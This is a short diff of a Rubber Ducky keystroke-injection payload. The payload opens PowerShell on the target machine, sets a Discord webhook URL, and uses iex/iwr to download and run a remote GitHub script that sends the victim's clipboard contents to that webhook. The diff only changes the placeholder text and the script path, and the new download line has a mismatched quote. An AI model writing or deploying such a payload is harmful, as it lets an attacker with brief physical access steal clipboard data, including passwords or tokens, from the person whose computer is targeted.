@@ -6,8 +6,8 @@ DELAY 500
 STRING powershell 
 ENTER
 DELAY 1000
-STRING $webhookUrl = 'INPUT YOUR DISCORD WEBHOOK'
+STRING $webhookUrl = 'INPUT YOUR DISCORD WEBHOOK HERE'
 ENTER
 DELAY 1000
-STRING iex (iwr 'https://raw.githubusercontent.com/ash-indigo/RubberDucky/main/send-clipboard-to-discord.ps1' -UseBasicParsing)
+STRING iex (iwr https://raw.githubusercontent.com/ash-indigo/RubberDucky/main/Clipboard%20to%20Discord/send-clipboard-to-discord.ps1' -UseBasicParsing)
 ENTER
